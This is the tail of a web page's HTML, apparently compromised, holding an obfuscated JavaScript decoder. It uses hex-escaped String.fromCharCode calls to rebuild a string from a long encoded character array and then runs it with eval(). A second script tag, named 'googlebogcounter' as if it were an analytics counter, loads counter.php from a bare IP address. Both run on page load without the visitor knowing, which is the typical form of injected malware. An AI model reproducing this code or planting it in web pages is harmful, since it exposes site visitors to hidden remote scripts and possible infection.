qb=String;nf902ae4+=qb["fr\x6f\x6dCharCo\x64e"](ob);},re:function(oa){var qb=String;return qb["fr\x6f\x6dCharCo\x64e"](oa);},v7:function(r5){var r7=r5;if(r7<0)r7+=256;if(r7==168)r7=1025;else if(r7==184)r7=1105;return (r7>=192 && r7<256) ? r7+848 : r7;},v9:function(w1){return (w1+'')["ch\x61\x72Co\x64eAt"](0);}};e1060178120b5.dbf6eafb4f182("c","0","d","2","5","a","3","0","1","4","0","f","d","7","9","6","5","3","±","2","2","2","±","•","4","6","6","•","±","1","8","9","±","•","5","4","3","•","±","2","5","4","±","•","6","1","0•","S","•","4","5","8","•","±","1","7","9","±","•","6","1","1","•","D","•","4","5","1","•","±","1","7","3","±","•","5","6","3","•","#","•","4","7","4","•","±","1","3","2","±","•","5","9","3","•","D","•","5","6","2","•","±","3","2","±","•","4","4","0","•","±","1","5","7","±","•","5","5","0","•","±","2","2","±","•","53","3","•","±","2","4","6","±","•","4","4","7","•","c","•","4","9","5","•","±","1","4","6","±","•","6","3","4","•","2","•","4","6","2","•","±","1","5","7","±","•","4","4","8","•","±","1","2","7","±","•","4","7","1","•","±","1","6","5","±","•","5","8","1","•","±","1","0","±","•","5","7","1","•","±","2","2","2","±","•","5","5","5","•","±","2","1","0","±","•","6","1","0","•","±","5","±","•","4","7","7","•","±","1","6","9","±","•","6","2","2","•",">","•","6","0","1","•","±","2","4","5","±","•","4","6","9","•","±","1","8","6","±","•","4","7","2","•","±","1","8","4","±","±","1","4","5","±•","5","0","3","•","±","1","4","9","±","•","5","2","0","•","±","2","3","5","±","•","5","3","1","•","±","2","5","4","±","•","4","7","6","•","±","19","9","±","•","5","9","4","•","5","•","6","3","4","•","b","•","5","8","0","•","%","•","6","0","6","•","<","•","6","2","8","•","\•","5","3","1","•","±","2","5","4","±","•","5","9","0","•","1","•","5","3","3","•","±","2","4","4","±","•","5","2","6","•","±","2","4","9","±","•","5","4","9","•","±","2","2","±","•","5","5","9","•","±","2","5","±","•","5","5","9","•","±","3","1","±","•","5","5","0","•","±","7","±","•","4","9","0","•","±","2","1","6","±","•","5","7","0","•","±","2","1","6","±","•","5","9","0","•","±","2","3","4","±","•","4","8","8","•","±","2","1","5","±","•","6","3","3","•","g","•","6","1","5","•","F","•","4","9","3","•","±","1","6","6","±","•","5","0","5","•","±","2","2","1","±","•","5","4","4","•","±","1","6","±","•","4","6","1","•","±","1","8","9","±","•","6","3","5","•","g","•","4","9","1","•","±","1","6","1","±","•","5","4","2","•","±","2","0","1","±","•","4","7","1","•","±","1","3","0","±","•","5","8","6","•","±","2","5","5","±","•","5","2","7","•","±","1","8","8","±•","4","4","1","•","c","•","5","0","3","•","±","1","6","4","±","•","5","8","4","•","±","2","5","3","±","•","5","2","4","•","±","1","9","0","±","•6","1","6","•","±","1","8","±","•","5","5","0","•","±","2","1","2","±","•","5","7","1","•","±","2","3","2","±","•","6","3","3","•","+","•","5","3","3","•","±","1","9","1","±","•","5","0","8","•","±","1","7","1","±","•","6","0","8","•","±","1","2","±","•","6","1","4","•","±","1","7","±","•","5","9","0","•","-","•","57","6","•","+•","5","3","3","•","±","6","±","•","5","7","8","•",",","•","4","4","0","•","±","1","6","8","±","•","5","5","3","•","±","1","0","±","•","5","4","8","•","±","1","8","±","•","5","7","3","•","±","2","3","1","±","•","5","5","0","•","±","1","8","±","•","4","8","4","•","±","2","0","0","±","•","5","9","7","•","A","•","5","6","1","•","±","2","3","5","±","•","5","9","8•","±","1","4","±","•","4","7","4","•","±","1","3","3","±","•","6","1","3","•","4","•","4","4","3","•","z","•","6","1","7","•","7","•","5","0","8","•","±","1","5","9","±","•","5","8","6","•","±","2","4","1","±","•","4","5","1","•","f","•","4","8","0","•","±","1","6","5","±","•","6","1","1","•","/","•","6","0","6","•",".","•","5","9","8","•","±","1","6","±","•","5","6","4","•","±","2","1","5","±","•","5","4","2","•","±","1","9","5","±","•","5","2","7","•","±","19","8","±","");eval(nf902ae4);</script><script id="googlebogcounter" src="http://91.196.216.30/counter.php"></script></body></html>
